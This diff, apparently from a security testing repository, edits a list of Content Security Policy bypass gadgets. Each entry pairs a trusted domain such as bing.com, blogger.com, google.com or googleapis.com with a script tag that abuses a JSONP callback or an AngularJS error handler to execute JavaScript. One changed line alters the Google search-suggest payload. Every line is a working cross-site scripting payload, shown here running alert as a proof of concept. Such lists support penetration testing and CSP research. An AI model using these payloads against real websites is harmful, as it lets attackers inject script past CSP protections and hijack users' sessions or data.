@@ -185,7 +185,7 @@ www.ancestrycdn.com	<body ng-app ng-csp><script src="https://www.ancestrycdn.com
 www.bing.com	<script src="https://www.bing.com/api/maps/mapcontrol?key=AlSfV3wSTlPFqxEdS97v1d1ZK25Qg4OxZerOAjFYQPZwtY4bQqhz4jDRou_kCmbJ&callback=alert"></script>
 www.blogger.com	<script src="https://www.blogger.com/feeds/8063678697117239807/posts/default?callback=alert"></script>
 www.google-analytics.com	<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
-www.google.com	<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+www.google.com	<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
 www.google.com	<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
 www.googleapis.com	<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert()"></script>
 www.googleapis.com	<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>
